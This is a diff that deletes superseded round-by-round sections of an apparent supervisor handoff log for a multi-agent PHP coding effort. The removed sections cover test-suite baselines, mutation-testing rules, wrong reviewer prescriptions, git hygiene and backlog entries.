-time. The two that failed: lane b's F3 measured its evidence in one window and prescribed a fix in another
-("both windows needed closing; only one was named"), and lane c's MAJOR 4 prescribed a `Failures:` carve-out
-that **cannot ever match** the prose form it targeted — the word precedes the digits, the pattern requires
-digits first. Measured: the naive widening reports 4 hits and 3 are correct round anchors.
-
-**Rule 7 outranks a reviewer's scope call.** Lane c's reviewer said "report only, do not edit" a stale
-paragraph; lane c edited it and declared why — its own commit is what made the paragraph false, and its
-new test quotes that paragraph as the statement of the gap. Leaving it would ship a reader pointed at a
-hole that no longer exists. That was the right call.
-
-### RULE 23 WORKED ONE ROUND AFTER IT WAS WRITTEN
-
-Lane a's two new `src/` files forced census bumps in `tests/Tools/BuiltInToolCorpusTest.php` and
-`src/Context/RepoMapBlock.php`. Lane a listed both as **INHERITED, not touched by me**, naming the commit
-and the reason. A guard's obligations are dynamic; the ownership map is static.
-
-### THE BACKLOG IS NOW 214 ENTRIES — E192–E220 ARE NEW
-
-E192–E200 (lane a) · E201–E209 (lane b) · E210–E220 (lane c). Renumbered **longest-id-first** so `Ec47-10`
-and `Ec47-11` were not eaten by the `Ec47-1` pattern — a new merge hazard, and the reason to keep doing it
-that way. No provisional id appeared in a source file for the third round running; E135's fix holds.
-
-**Start the next round with these:**
-- 🔴 **E192 + E193 together** — the remaining three mid-session emitters and the idle-tick problem. See
-  above; this is the round's obvious lane a.
-- **E194** — no PHPUnit-level reset for `RuntimeNoticeSink`. It is a process-wide static any test can arm;
-  262 armed records across six classes were measured. A proper fix needs an `<extensions>` block in
-  `sugar-crush/phpunit.xml`, which is **supervisor-owned — that is a DECISION, not an edit.**
-- **E195** — channel 6's alphabet is blind to FOUR call shapes, not the one its doc-block named.
-- **E173's remainder / E210–E220** — lane c's eleven, including the provenance-of-a-figure problem: an
-  anchored total cannot be validated by character distance from a sha, because correct round-anchored
-  citations sit 62–110 characters away. **The sentence, not a character count, is the unit of provenance.**
-- **E124** — monorepo-root scope, still needs a supervisor decision before a lane can own it.
-
-Then the carried queue: **E154's remaining sites**, **E59's real-worker half**, **E61's L**, **E79**,
-**E77**, **E88** (`SelectPaneMsg` wiring), `keybindings` (L, DEFER — see E110), then **Phase 9**
-(interactive-prompt containment), then the deferred security pass.
-
-### ⚠️ CAVEATS THAT CARRY FORWARD
-
-**`php-cs-fixer` is genuinely absent on this box.** **PHP 8.4 was not exercised** — every token-lexing,
-width, regex and stdlib claim in rounds 45–47 is PHP 8.3.6 only. **Nothing inside a test can bound a child
-that outlives the whole PHPUnit process**; `tearDown()` closes the abort case only, and the rest needs a
-`phpunit.xml` decision.
-
----
-
-## SUPERSEDED — round 46's block, kept for its reasoning (its floor 9378 is superseded by §0-NOW-56; its rules are NOT)
-
-**SUITE FLOOR: `9378 / 131610 / 1 skipped / rc 0` at `dbb8e834`** (renumbering `15fb34ff`, backlog
-`c4a810a1`), supervisor-measured in the live tree after merging all three round-46 lanes (04:25.272,
-278.40 MB). Supersedes every earlier figure (9308 held the round-45 boundary, 9215 round 44, 9078 round
-43). `sugar-crush` was **linked** — a published-mode tree reports a different skip count and is NOT
-comparable. **Skips MUST stay exactly 1**, confirmed by name (`--filter McpClientTest` → 60 tests, 1
-skipped). 18/18 symlinks by `is_link()`; `md5sum .sugar-crush/config.json` =
-`05480c743aff302fd6c06c5a4a4c2210`; `check-path-repos --no-lib-path-repos` rc 0; the only tracked
-`composer.lock` is the root one.
-
-🔴 **MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM** (E167). Round 46's brief did
-this and lane c OBSERVED the declared floor directly, closing the one figure round 45's lanes could not.
-Cut the lane copies, then measure at that exact commit.
-
-### 🔴 ON RESUME, THE REVIEW'S STATED HEAD MAY BE THREE OR MORE COMMITS STALE (E190)
-
-Round 46's weekly limit killed two fix agents. Resuming by run id replayed the seven completed agents and
-ran the two missing ones — **but the replayed review was cached, and it described lane c's HEAD as
-`0df3fe89` with every finding outstanding. The lane's actual HEAD was `4e45e555`: six further commits by
-the killed fix agent**, mapping one-to-one onto the review's MAJOR 1–4 and MINOR 5–6. It had committed and
-then died before reporting.
-
-E168 covers the agent that dies mid-MUTATION leaving dirt. **This is the agent that dies mid-REPORT
-leaving committed work nobody has been told about.** The replacement handled it correctly without being
-told to. **Put it in the fix-agent brief:** re-derive HEAD with `git log --oneline <base>..HEAD` before
-believing any sha in the review or the brief; if commits exist the review does not mention, verify them by
-mutation, do not redo them, and say so.
-
-E168's own check paid off in the negative: all three lane trees were clean on arrival, checked **before**
-merging rather than at the end.
-
-### THE PREDICTION RULE, CORRECTED — PREDICATE, NOT SCOPE (E191)
-
-**Tests 9378, predicted exactly — fourth round running.** Assertions landed on **131610, exactly the
-additive lower bound, and the supervisor had predicted a strict overshoot. That was wrong.**
-
-**A new census inflates a merged total only when a sibling's additions fall inside its PREDICATE, not
-merely inside its scan scope.** Lane b's new scanners walk all of `tests/` but assert per fork site and
-per fixture; lane a's two new test files contain zero `pcntl_fork` calls, so nothing matched. Round 44's
-stale-figure census asserted once per PARAGRAPH of every file, where every sibling addition necessarily
-matches — that is why THAT one overshot by 48.
-
-**Keep predicting tests additively and assertions as a lower bound. Do not promise an overshoot just
-because a guard walks a directory a sibling touched.**
-
-### 🔴 A GUARD CAN COMPEL A LANE OUT OF ITS FILE SPLIT — CHECK THIS WHEN ASSIGNING LANES
-
-Lane a gated `CommandLoader`'s refusals behind a new `SUGARCRUSH_DEBUG_COMMANDS` flag (rule 6: gate, never
-delete). Round 45's `EnvRosterDriftTest` then **required** a row in `sugar-crush/docs/ENVIRONMENT.md`,
-which was not in lane a's file list — **the lane could not complete its assigned work without breaching
-its split.** It cost nothing only because no sibling owned `docs/` this round.
-
-**The ownership map is static; a guard's obligations are dynamic.** When a lane's work adds an env var, a
-stderr write or a seam call, its file list MUST include the roster page the corresponding guard requires.
-
-### 🔴 EIGHT WRONG REVIEWER PRESCRIPTIONS ACROSS FOUR ROUNDS
-
-Round 46 added two, and one of them is the most dangerous shape yet: lane a's BLOCKING 1 prescription
-**closed the four target shapes and simultaneously made the guard claim a call passes a flag it does not
-pass** — and over the real `src/` the census still produced the pinned roster, **so the suite would have
-stayed green with the new hole in it.** The other was correct but unpinned: "drop the `continue`" was
-right, and re-adding it SURVIVED, because no file in `src/` today makes the two instruments disagree.
-
-Two reviewer FIGURES also failed to reproduce (402/629 measured three times, not 404/627; 95 `?->` across
-28 files, not 97 across 29). Both findings stood; only their numbers were wrong. **Re-derive from the
-tree, never from the review.**
-
-### THE BACKLOG IS NOW 185 ENTRIES — E169–E191 ARE NEW
-
-E169–E175 (lane a) · E176–E183 (lane b) · E184–E189 (lane c) · E190 · E191. **All three lanes filed this
-round — the first time lane a has.** All used lane-prefixed provisional ids and none appeared in a source
-file, so the renumber needed no in-code repointing. E135's fix has now worked two rounds running; keep it.
-
-**Start the next round with these:**
-- 🔴 **E171 — the transcript seam is LAUNCH-ONLY, and five classes need a mid-session one.** This is the
-  structural blocker under E170, and it is the same constraint Phase 9 step 1 has. Doing this unlocks
-  several other entries; it is the highest-leverage item in the backlog right now.
-- **E170** — the 18 tool-call-parser `error_log()` sites. Both classes are `final readonly`, so there is
-  no accumulator to gate against; they need E171's sink. Their tests live under
-  `tests/Providers/ToolCallParser/` and assert the `error_log()` text, so the lane that does this needs
-  those files too.
-- **E173** — `--output-format json` never carries a permission refusal.
-- **E177 / E178 / E180** — live bare-exit offenders inside PHPUnit (`MailboxTest`, `WorkflowEngine`'s
-  interrupt handler, `TaskListTest` twice), found only because the scanner learned to read
-  `\pcntl_fork()`. Recorded as *open*, not exempted, with a guard that forces the row's deletion once
-  fixed. **E179** — widen the reaper's adoption scope beyond `tests/Integration/`.
-- **E186 / E187** — the `sprintf()` formats that are inline on purpose versus those that only looked that
-  way (a mutation is what told them apart), and the doc pages nothing sweeps for unguarded quotes.
-- **E188** — three stale class-total cardinalities over `tests/` shipped this round. Rule 18 again.
-- **E124** — monorepo-root scope, still needs a supervisor decision before a lane can own it.
-
-Then the carried queue: **E154's remaining sites**, **E59's real-worker half**, **E61's L**, **E79**,
-**E77**, **E88** (`SelectPaneMsg` wiring), `keybindings` (L, DEFER — see E110), then **Phase 9**
-(interactive-prompt containment), then the deferred security pass.
-
-### ⚠️ CAVEATS THAT CARRY FORWARD
-
-**`php-cs-fixer` is genuinely absent on this box.** New files are PSR-12 by inspection and by matching
-neighbours, not by tool. **PHP 8.4 was not exercised** — every token-lexing, width, regex and stdlib claim
-in rounds 45 and 46 is PHP 8.3.6 only. Round 46's token-constant claims (`\pcntl_fork` ⇒
-`T_NAME_FULLY_QUALIFIED`, `exit`/`die` ⇒ `T_EXIT`, `"{$x}"` ⇒ `T_CURLY_OPEN`) are documented as stable
-across 8.3/8.4 but were executed on 8.3.6 only.
-
-**E80 is diagnosed (round 45) and its mechanism is now partly mitigated (round 46's reaper trait), but
-nothing inside a test can bound a child that outlives the whole PHPUnit process.** `tearDown()` closes the
-abort case only. A process-group kill or a `phpunit.xml` change would be needed, and `phpunit.xml` is
-supervisor-owned — that is a DECISION, not an edit.
-
----
-
-## SUPERSEDED — round 45's block, kept for its reasoning (its floor 9308 is superseded by §0-NOW-56; its rules are NOT)
-
-**SUITE FLOOR: `9308 / 130874 / 1 skipped / rc 0` at `ee77252c`** (backlog additions at `5daa7420`),
-supervisor-measured in the live tree after merging all three round-45 lanes (04:19.629, 276.40 MB).
-Supersedes every earlier figure (9215 held the round-44 boundary, 9078 round 43, 8996 round 42).
-`sugar-crush` was **linked** for this measurement — a published-mode tree reports a different skip count
-and is NOT comparable. **Skips MUST stay exactly 1**, confirmed by name this round rather than by count
-(`--filter McpClientTest` → 60 tests, 1 skipped). 18/18 symlinks in `sugar-crush/vendor/sugarcraft/` by
-`is_link()`; `md5sum .sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`;
-`php tools/check-path-repos.php --no-lib-path-repos` rc 0; the only tracked `composer.lock` is the root
-one, which is legitimate and stays.
-
-### 🔴 MEASURE THE FLOOR AT THE COMMIT THE LANES BRANCH FROM — NOT AT THE MERGE COMMIT (E167)
-
-Round 45's brief carried `9215 / 127781`, measured at round 44's merge commit `98d59bfb`. **The lanes
-branched from `06126017`, three commits later, and one of those three was the supervisor's own E131 prose
-fix to `src/Config/LayeredSettings.php`.** `GlobFigureDriftTest` asserts once per paragraph of every
-`.php` under `src/`, so that fix moved the assertion count by +1. True base: **`9215 / 127782`**.
-
-Lane a reverted its diff and observed it; lane b reverted all four of its files and observed it; lane c
-flagged it and **correctly refused to adjudicate** without a checkout that would dirty its tree. **The
-brief was the outlier and the lanes were right.** Cut the lane copies, then measure the floor in one of
-them (or at that exact commit) immediately before launching.
-
-⚠️ Lane b's revert technique is the one to copy: `git show <sha>:<path> > <path>`, **never**
-`git checkout <sha> -- <path>`, which STAGES — and a staged-but-restored file made `git diff --quiet` lie
-once in lane a this round. Follow a pathspec checkout with `git reset -q HEAD -- <dir>`.
-
-### THE PREDICTION RULE, CONFIRMED AND REFINED
-
-Predicted **9308 tests exactly** and **assertions ≥ 130874** as a lower bound, in writing, before
-measuring. **Both landed on the number. Tests have been exact three rounds running.**
-
-The lower bound being tight is NOT evidence that round 44's non-additivity rule was wrong. Lane b
-measured the mechanism to the unit: its `Runtime.php` edits net exactly +2 paragraphs, which appeared as
-+2 in `GlobFigureDriftTest` — **a third file nobody touched** — attributed by diffing per-testcase counts
-out of `--log-junit` at both ends rather than argued. Each lane caused its own census drift inside its own
-tree, so the terms composed. **Keep predicting tests additively and assertions as a lower bound, and keep
-saying which it is.**
-
-### 🔴 A MUTATION HARNESS WHOSE RESTORE IS A LATER STEP IN THE SAME AGENT DOES NOT SURVIVE THE AGENT DYING (E168)
-
-Round 45's first launch died at a session limit with 5 of 9 agents mid-flight. Lane a's tree was left dirty
-with `src/Chat.php` and `tests/Cli/BootstrapLaunchNoticeRoutingTest.php` carrying a figure rewritten to
-"nineteen" in a paragraph stating `Bootstrap.php` holds sixteen calls — incoherent on its face, and
-`TRANSCRIPT_SEAM_CALL_SITES` is 16, so it was an oracle probe, not fix work (`Chat.php` is not even in
-lane a's file list). No backup existed. **Had the resume handed that tree to a fresh fix agent it would
-have committed the nonsense or chased a red it did not cause.**
-
-**Three parts, all of which lane c's `mut.sh` had and lane a's did not:** (1) the backup is written
-BEFORE the mutation; (2) the restore is VERIFIED by `git status --porcelain` returning empty; (3) 🔴 **the
-supervisor checks every lane tree for a dirty worktree BEFORE merging**, not only at the end. Lane c's
-harness also exits 94 on a no-op and prints the actual `+`/`-` lines — it caught a no-op that would have
-read as a survival, and an rc-255 PHP fatal that is neither a kill nor a survival.
-
-**Resuming a killed workflow works and is cheap:** `Workflow({scriptPath, resumeFromRunId})` replays
-completed agents from cache and runs only the missing ones. Copy the script out of the scratchpad at
-launch — the scratchpad does not survive a session end.
-
-### E135's FIX WORKED, TWICE — KEEP LANE-PREFIXED PROVISIONAL IDS
-
-Both filing lanes used `Eb45-N` / `Ec-N` and **not one appeared in any code file**, so the round-44 bug
-where a renumber orphaned an in-code citation could not recur. Renumbered at merge: lane b `E136–E143`,
-lane c `E144–E151`. Keep this. Numbering now continues from **E168**.
-
-### OWNERSHIP HELD COMPLETELY — THE REVIEW-PROMPT FIX WORKED
-
-Zero code overlap; the only collision across all three lanes was the backlog. Lane c **declined an
-out-of-lane edit its reviewer prescribed**, which is exactly the round-44 fix landing. It did make one
-deliberate in-lane edit beyond its prescription, to a doc-block whose last clause was false, and argued
-it: *"leaving a known-false sentence next to its correction is how the pairing propagated in the first
-place."* That is the right instinct and the right scope.
-
-### 🔴 SEVEN REVIEWER PRESCRIPTIONS HAVE NOW BEEN WRONG ACROSS THREE ROUNDS — THREE THIS ROUND
-
-**A prescription in a review is a hypothesis. Re-derive from the tree, never from the review.**
-
-- Lane c's **F7 prescription was incomplete** — "make the strip conditional on the text being PHP" reads
-  as a leading-`/**` test, but `censusScope()` feeds whole `.php` files through the window, so that
-  discriminator kills the strip for the larger half of the census. Its stated **alternative** would have
-  reddened all 93 legitimate `**bold**` lines.
-- Lane c's **R5 does not reproduce at all** — the file it named has a flat door list with no key conjunct.
-  Filed as a transplant warning rather than left as a hypothesis.
-- Lane a's **F5 prescription would not have closed F5** — a value-equality check passes on precisely the
-  mutation that motivated it, because the mutation re-inlines a different string.
-
-Lane a also found an inverted claim **the review never raised**: a doc-block said the old source scrape
-"goes quiet the moment the line is reformatted". It goes **loud** — both recovery steps were
-`assertSame(1, $matched)`.
-
-### THE EMPTY-CENSUS RULE FIRED AGAIN, IN A NEW FILE
-
-Blinding lane c's mention census (`$found[$name][] = $label;` → `;`) left **both** empty-result tests
-green at 641 assertions. Round 44's rule holds and is not yet internalised: **every guard that asserts an
-absence needs a known-positive fixture through the same scanner in the same test.** Lane c's F2 is the
-same shape from another angle — a conjunct subsumed by its neighbours left **149 tests green** while the
-key-identity half of the rule was dead.
-
-### 🔴 THE BACKLOG IS NOW 168 ENTRIES — E136–E168 ARE NEW
-
-E136–E143 (lane b) · E144–E151 (lane c) · **E152–E166 filed by the supervisor from lane a's report, which
-for the second round running filed nothing itself** · E167 (floor provenance) · E168 (mutation-harness
-structure).
-
-**Start the next round with these:**
-- **E154** — 38 `error_log()` sites in `src/` write unprefixed, unrouted, to the user's stderr. **A write
-  to fd 2 while the alternate screen is up lands on a frame the renderer believes it owns.** Per-file
-  counts are pinned by `StderrEmitterCensusTest`, so a 39th reds. Needs per-site triage.
-- **E152 / E153** — `ReadmeSettingsTierClaimTest` still retypes the launch format E118 promoted, and
-  `PROJECT_TIER_TOOL_REMOVAL_LEAVING_NONE` has no external reader at all.
-- **E156** — the 62 `sugarcrush:` stderr lines are a HARNESS property (inherited child stderr), with the
-  eleven owning test files named. 🔴 **Silencing at the source is the WRONG default — for most shapes the
-  line IS the assertion.**
-- **E142** — `pcntl_alarm` fires in the process that armed it, so the per-test time limit does not reach a
-  forked child. This is E80's mechanism. Needs a DECISION (`phpunit.xml` is supervisor-owned); the cheap
-  90% is a shared trait that records child pids and SIGKILLs survivors in `tearDown()`.
-- **E164** — ten literal `sprintf()` formats in `Bootstrap.php` unwalked. **The promotion rule is external
-  readership, not tidiness.**
-- **E144 / E148 / E149** — the fourth `paragraphs()` copy, and the mention oracle's surface alphabet and
-  whitespace blind spots. Both measured EMPTY today, which is why they are entries and not fixes.
-- **E124** — monorepo-root scope, still needs a supervisor decision before a lane can own it.
-
-Then the carried queue: **E59's real-worker half**, **E61's L**, **E79**, **E77**, **E88**
-(`SelectPaneMsg` wiring), `keybindings` (L, DEFER — see E110), then **Phase 9** (interactive-prompt
-containment), then the deferred security pass.
-
-### ⚠️ TWO CAVEATS FROM ROUND 45 THAT NOBODY SHOULD LOSE
-
-**`php-cs-fixer` is genuinely absent on this box** — `command -v` empty, `sugar-crush/vendor/bin` and root
-`vendor/bin` both empty. Round 45's new files are PSR-12 by inspection and by matching neighbours, not by
-tool. The repo config is `@PSR12`-based, which does not sort imports or reorder class elements, so
-mid-class `private const` declarations and private methods placed beside their callers are not violations.
-Worth a fixer pass whenever the tool exists.
-
-**PHP 8.4 was not exercised.** Every width, regex and stdlib-behaviour claim in round 45's prose and
-reports is PHP 8.3.6 only, and nothing in the tree claims otherwise.
-
-### 🔴 E80 IS DIAGNOSED — AND IT IS NOT WHAT IT LOOKED LIKE
-
-Lane b established it is **a forked child running PHPUnit's own teardown** after the parent aborted at the
-60s limit — not lock starvation. See E142 for the mechanism and the decision it needs. Lane b also killed
-a real 2% rendezvous flake (`max($seen, count(glob(...)))` overshooting when callers outnumber `peers`,
-E141) that had already produced one false KILL verdict on an unrelated mutation.
-
----
-
-## SUPERSEDED — round 44's block, kept for its reasoning (its floor 9215 is superseded by §0-NOW-56; its rules are NOT)
-
-**SUITE FLOOR: `9215 / 127781 / 1 skipped / rc 0` at `98d59bfb`**, supervisor-measured in the live tree
-after merging all three round-44 lanes (04:17.446, 276 MB). Supersedes every earlier figure (9078 held
-the round-43 boundary, 8996 round 42). `sugar-crush` was **linked** for this measurement — a
-published-mode tree reports a different skip count and is NOT comparable. **Skips MUST stay exactly 1**
-(`tests/MCP/McpClientTest.php`). 18/18 symlinks in `sugar-crush/vendor/sugarcraft/` by `is_link()`;
-`md5sum .sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`;
-`php tools/check-path-repos.php --no-lib-path-repos` rc 0; zero tracked per-lib `composer.lock`.
-
-### 🔴 THE PREDICTION RULE HAS CHANGED — ASSERTION COUNTS ARE NOT ADDITIVE ACROSS LANES
-
-Predicted **9215 / 127733**. Tests hit **9215 exactly** (two rounds running). Assertions came in at
-**127,781 — +48 over prediction**, and the cause is structural, not a lane error:
-
-**A lane that ships a census walking `src/` or `docs/` asserts per file and per paragraph, so a SIBLING
-lane adding prose raises THAT lane's assertion count with no code change on either side.** Measured by
-running lane a's three census files in both trees — same 93 tests, 21,747 assertions at merged master vs
-21,699 at lane a's own HEAD. Attributed exactly: `GlobFigureDriftTest` +46, `SymbolCitationDriftTest` +2,
-`EnvRosterDriftTest` 0.
-
-**So: predict tests from the deltas as before. Predict assertions as a LOWER BOUND whenever any lane's
-diff contains a guard that enumerates files or paragraphs — and say so when you state the prediction.**
-The two round-43 rules still hold and still work (re-measure after the fix stage; run and reconcile
-`git diff <base>..HEAD -- 'sugar-crush/tests/**' | grep -c '^+ *public function test'` in writing).
-
-### 🔴 AN EMPTY CENSUS IS A WEAKER GUARD THAN A CENSUS OF ONE — AND THIS WAS PROVED, NOT ASSERTED
-
-E103 emptied the stale-figure census. An assertion of `[]` **also passes in a tree where the scanner has
-quietly stopped working**. Lane a built the defence and the supervisor mutated the scanner to never match:
-
-- `testNothingInScopeStillCarriesTheStaleFigureAndTheSettingsPageAgrees` — **PASSED**, 18,228 assertions,
-  entirely green, instrument dead.
-- `testTheCensusScannerStillFindsAKnownStaleParagraph` — **RED**, with the message *"the census scanner no
-  longer finds a paragraph it is meant to find, so its verdict on src/ and docs/ is worthless."*
-
-**Every guard that asserts an absence needs a known-positive fixture run through the same scanner in the
-same test.** This is now a briefing rule, not an observation.
-
-⚠️ **THE SUPERVISOR'S FIRST MUTATION WAS A NO-OP AND PRODUCED A FALSE GREEN** — a `perl` substitution that
-matched nothing, followed by a clean run that proved nothing. **`git diff --numstat` after every mutation,
-before believing the result.** Rule 13 applies to the supervisor.
-
-### ⚠️ THINGS THAT CHANGE HOW YOU WORK — round 44's additions
-
-**A PRESCRIPTION IN A REVIEW IS A HYPOTHESIS. THE ACCEPTANCE TEST FOR A FIX IS A MUTATION OF *THE FIX*,
-NOT OF THE ORIGINAL DEFECT.** Lane b's reviewer prescribed `hasProperty('skillNudge')` as the bystander
-predicate — `nudgeSpendRoster()`'s own first gate. Holding a tracker is not spending a budget (`Write` and
-`Edit` both hold one and pass no budget), and the mutation that added the constant to `Write` under that
-predicate **survived**.
-
-**TWO REVIEWER PRESCRIPTIONS WOULD HAVE SHIPPED DEFECTS THIS ROUND.** Lane a's would have reddened **ten
-correct paragraphs** containing the phrase "UTF-8 byte". Both lanes measured before implementing, and both
-were right to. **Re-derive from the tree, never from the review.**
-
-**A DOC-BLOCK WRAPS AT 80 COLUMNS WITH ` * ` ON EVERY CONTINUATION, SO A SENTENCE IS NEVER THOSE BYTES IN A
-ROW.** Lane b's `assertStringNotContainsString(<sentence>, $rawSource)` survived re-adding the sentence —
-the same defect the fix existed to close, committed inside the fix for it. **Flatten continuation markers
-before matching prose in source.**
-
-**A CENSUS THAT ADMITS A BLIND SPOT AND THEN REPORTS ZERO HAS REPORTED NOTHING.** Lane c's filed entry said
-the shared-`/tmp` sweep found none; it missed a **real** instance **forty lines from the fix the entry was
-about**, because the census keys on the argument reaching `sys_get_temp_dir()` and that one arrives via a
-constructor hop. Its own residual paragraph had named that class of miss in the abstract.
-
-**A CARDINALITY MEASURED IN A LANE WORKTREE IS INVALIDATED BY ANY SIBLING LANE'S MERGE.** `LayeredSettings`
-shipped "66 files and 68"; both were right in lane a and wrong at master (71 and 73). Fixed by **dropping
-the totals and keeping the generator** — the paragraph's real claim was a negative that survived the merge
-untouched. **Ship the generator and the claim, not the count.** (E131, fixed `e29608d1`.)
-
-**AN IN-CODE CITATION OF A BACKLOG ID IS A CROSS-FILE REFERENCE THE MERGE CANNOT SEE.** Lanes b and c both
-started at E112; lane c's were renumbered E118–E122, but lane c had already written `E112`/`E113` into a
-test's failure message that tells a reader which entry to consult. Fixed `c4a799ab`. **Grep the merged diff
-for the renumbered range before committing the conflict resolution.** (E135.)
-
-### 🔴 FIX THE REVIEW PROMPT BEFORE LAUNCHING ROUND 45
-
-**The review prompt tells reviewers to CHECK the file split and never tells them they are BOUND by it when
-prescribing a fix.** Lane c edited `docs/SETTINGS.md` — lane a's file — on its reviewer's explicit
-instruction. It merged cleanly (disjoint sections) so no damage, but all three lanes independently decided
-the ownership map was wrong for their findings and two acted on it.
-
-**Add to the review prompt:** *a finding in another lane's file is REPORTED, never prescribed as an edit;
-say what the other lane's owner should do and move on.* Keep naming the contested files by owner in all
-three briefs — that part worked again for code (zero code collisions).
-
-⚠️ Lane b's `bin/sugarcrush` edit is the weaker justification: it overrode a constraint its own implementer
-had accepted, because its own brief was silent. **"Not explicitly forbidden" is the argument shape that
-erodes ownership over rounds.** Both its out-of-list edits were verified comment-only.
-
-### 🔴 THE BACKLOG IS NOW 129 ENTRIES — E112–E135 ARE NEW
-
-E112–E117 (lane b) · **E118–E122 (lane c, renumbered from its own E112–E116 at merge — the SECOND round
-running that two lanes collided on the same number; check before citing a round-44 entry)** · **E123–E135
-filed by the supervisor**, nine of them lane a's, which deliberately filed nothing to avoid the three-way
-append conflict lanes b and c then hit.
-
-**Start the next round with these:**
-- 🔴 **E119** — `Bootstrap.php` still says "eleven other sources" where the answer is fifteen. ⚠️ **It is
-  pinned AS STALE** by `BootstrapTranscriptSeamCallSiteCensusTest::testTheKnownStaleSentenceOutsideThisLane
-  IsStillStale()`, whose failure message is the instruction: add the sentence to `PROSE_SITES` with
-  `'offset' => 1` and **delete that test in the same commit**. A tripwire on a deliberate hole — the model
-  to copy when a lane cannot own the file its finding lives in.
-- 🔴 **E118** — promote the seam count to a `public const` on `Bootstrap` (E104's better home), then drop
-  `bootstrapMethodSource()`/`soleMatch()` from `ReadmeRosterDriftTest`.
-- **E133** — the payload probe still globs shared `/tmp`; only attribution moved. Needs
-  `Runtime::executeConcurrently()` reserving payload names in phase 1 **before** forking. ⚠️ The cheap fix
-  is ruled out and the negative is recorded: `sys_get_temp_dir()` caches on first use and ignores a runtime
-  `putenv('TMPDIR=…')` on PHP 8.3.6.
-- **E134** — make the mutation-harness contract explicit in every brief (refuse a dirty tree, `git clean
-  -fdq`, scratchpad backup before mutating a file with uncommitted work). Round 44 produced two instances
-  in opposite directions, one of which destroyed ~250 lines.
-- **E120** — 62 unowned `sugarcrush:` stderr lines in a full run, one of them argued for. Supervisor
-  reproduced the 62 independently.
-- **E125** — three copies of `paragraphs()`, sharing one blind spot: a stale sentence inside a fenced code
-  block or a table row is invisible to **every** doc-drift guard at once.
-- **E123 / E124** — env names in `README.md`, eleven other `docs/*.md` pages, and `docs/_data/` are outside
-  every oracle. E124 is monorepo-root scope and needs a supervisor decision before a lane can own it.
-
-Then the carried queue: **E59's real-worker half**, **E61's L**, **E79**, **E77**, **E80** (the flake),
-**E88** (`SelectPaneMsg` wiring), `keybindings` (L, DEFER — see E110), then **Phase 9**
-(interactive-prompt containment), then the deferred security pass.
-
-### 🔴 E80 IS STILL A REAL FLAKE AND DID NOT FIRE THIS ROUND EITHER
-
-`MultiAgentRefactorTest::testArchitectPlansTwoCodersImplementInParallelReviewerVerifiesLeadMerges` —
-`pcntl_fork()` + SQLite `flock()` with a **capped** backoff. **If a full-suite run comes back rc 1 with
-exactly one risky test and ~22 missing assertions, this is it — re-run before diagnosing anything else.**
-
-⚠️ **E96 DID fire this round, twice**, and it is now fixed: two lanes' baseline runs went rc 1 on foreign
-`sc_runtime_tool_*` files from a sibling lane. **A red baseline in a lane is not automatically the lane's
-fault when three suites share `/tmp`** — check `E133`'s residual before diagnosing.
-
-### VENDOR / DEPENDENCY STATE — unchanged since round 42
-
-53 libs linked, 0 mixed, 0 published; root `composer.lock` updated and committed (`2d78013d`);
-`sugar-crush` deliberately held at its round-42 third-party versions so the floor stays comparable —
-**when they are refreshed, re-measure the floor in the same commit and say so here.**
-
-**A published-mode `php scripts/refresh-deps.php` pass is still available and still unrun** (master was
-pushed by the user during round 43; nothing since round 44 has been pushed). Give `sync-sugarcraft.yml`
-and the Packagist webhook time, then the script's own post-condition (fingerprinting every vendored
-sibling's `src/` against the working tree) tells you whether the pipeline caught up. ⚠️ **Keep
-`sugar-crush` LINKED regardless** — published mode moves its skip count 1 → 2 and voids every floor
-comparison in this file.
-
-⚠️ Pushing remains outward-facing and is **not** something to do unilaterally.
-
-### CONCURRENCY IS **3**, BY EXPLICIT USER INSTRUCTION
-
-The user offered 5 mid-round-44 and then said *"although id prefer 3"*. `docs/plans/crush_code_concurrency.md`
-is unchanged and remains the authority for the mechanics; its arithmetic says sustainable N = 3, hard cap 4.
-Host capacity is NOT the constraint (48 cores, 219 GB available, 1.1 TB free). A read-only scout does not
-count against the budget. ⚠️ **P8.8 and P8.13 still collide with each other** — never bundle those two.
-
-### LANE HYGIENE — round 44's dirs and branches are GONE, and the verification order matters
-
-`/home/sites/crush-lane-{a,b,c}` removed and `drain44-{a,b,c}` deleted — **but only after** confirming per
-lane that every file in the lane's diff is byte-identical in master (the only two that differ are the
-knowingly shared `docs/SETTINGS.md` and the backlog), and that `git branch --merged master` listed all
-three. Do it in that order; a lane dir removed before the check is unrecoverable.
-
-⚠️ **Keep the lane dirs until AFTER the merged floor is measured** — round 44 needed lane a's tree alive to
-attribute the +48 assertion gap, and it would have been unrecoverable an hour later.
-
----
-
-## SUPERSEDED — round 43's block, kept for its reasoning (its floor 9078 is superseded by §0-NOW-56; its rules are NOT)
-
-**SUITE FLOOR: `9078 / 105590 / 1 skipped / rc 0` at `628f50f1`**, supervisor-measured in the live tree
-after merging all three round-43 lanes (04:12.390, 270 MB). Supersedes every earlier figure (8996 held
-the round-42 boundary, 8978 round 41). `sugar-crush` was **linked** for this measurement — a
-published-mode tree reports a different skip count and is NOT comparable. **Skips MUST stay exactly 1**:
-confirmed still `tests/MCP/McpClientTest.php` by running that file alone (60 tests, 1 skipped), and the
-closure canary `GitignoreAwarenessTest::testTheMonorepoPathRepoSymlinksAreNotFollowed` was run by name
-and **PASSED rather than skipping**. 18/18 symlinks in `sugar-crush/vendor/sugarcraft/`;
-`md5sum .sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`;
-`php tools/check-path-repos.php --no-lib-path-repos` rc 0; zero tracked per-lib `composer.lock`.
-
-🟢 **THE MERGED-TOTAL PREDICTION MATCHED ON BOTH FIGURES — tests AND assertions — for the first time.**
-Predicted **9078 / 105590** from the lane deltas (a +18/+159, b +32/+92, c +32/+160). Both hit exactly.
-The two rules added after round 42's miss-by-2 are what did it, and they stay in every brief:
-1. **A lane's figures are re-measured AFTER its fix stage**, never carried forward from implement.
-2. **Every fix agent runs the cross-check and reconciles it IN WRITING:**
-   `git diff <base>..HEAD -- 'sugar-crush/tests/**' | grep -c '^+ *public function test'`.
-
-⚠️ **A cross-check that DISAGREES is not a failed cross-check — it is the point.** In two of three lanes
-the two numbers legitimately differed and the lane had to explain the gap. `grep -c '^+ *yield '` over the
-same diff is the cheap closer: lane b was 9 methods vs +32 tests, and 9 + 17 provider rows = 26 = the
-`yield` count exactly, so 7 plain + 26 rows − 1 renamed = +32. Lane c was 28 vs +32 (27 net + 5 provider
